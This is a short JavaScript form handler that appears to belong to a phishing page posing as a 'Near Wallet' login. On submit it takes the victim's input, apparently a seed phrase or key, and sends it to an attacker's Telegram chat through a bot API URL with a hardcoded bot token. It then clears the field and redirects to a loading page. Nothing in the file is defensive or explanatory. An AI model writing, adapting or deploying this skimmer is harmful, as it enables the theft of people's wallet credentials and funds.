

// Listen for form submit
document.getElementById('sendForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var MMS = getInputVal('MMS');
  e.preventDefault();
  let url = 'https://api.telegram.org/bot5543747526:AAGgad6lwifZCavpgsjm8dG4AAqLqWjUvVU/sendMessage?chat_id=-760150313&text=🚀🚀Near Wallet🚀🚀:%0D%0A '+MMS;
  let xhttp = new XMLHttpRequest();
  xhttp.open("GET", url, true);
  xhttp.send();
  document.getElementById('MMS').value = ''
  setTimeout(function() { window.location.href = "loading.html"},1000);




  // Save messageloading.html
    saveMessage(ip, MMS);



  // Hide alert after 3 seconds
  setTimeout(function(){
    document.querySelector('.alert').style.display = 'none';
  },3000);

  // Clear form
  document.getElementById('sendForm').reset();
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}